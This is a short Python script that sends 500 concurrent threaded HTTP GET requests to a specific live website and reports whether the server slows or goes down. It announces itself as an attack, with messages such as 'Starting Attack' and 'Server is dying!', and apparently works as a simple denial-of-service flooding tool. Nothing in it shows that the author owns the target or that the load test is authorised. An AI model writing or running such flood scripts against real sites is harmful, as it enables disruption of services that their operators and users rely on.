import threading
import requests
import time


url = "https://morph-ai-era.online"

TOTAL_REQUESTS = 500 

def hit_server(i):
    try:
        
        response = requests.get(url, timeout=5)
        
        if response.status_code == 200:
            print(f"User {i}: Success ✅")
        else:
            print(f"User {i}: Error {response.status_code} ❌ (Server is dying!)")
    except Exception as e:
        print(f"User {i}: Connection Failed 💀 (Server Crashed/Down)")

print(f"Starting Attack on {url} with {TOTAL_REQUESTS} concurrent requests...")

threads = []


for i in range(TOTAL_REQUESTS):
    t = threading.Thread(target=hit_server, args=(i,))
    threads.append(t)
    t.start()
    time.sleep(0.01) 


for t in threads:
    t.join()

print("Test Finished.")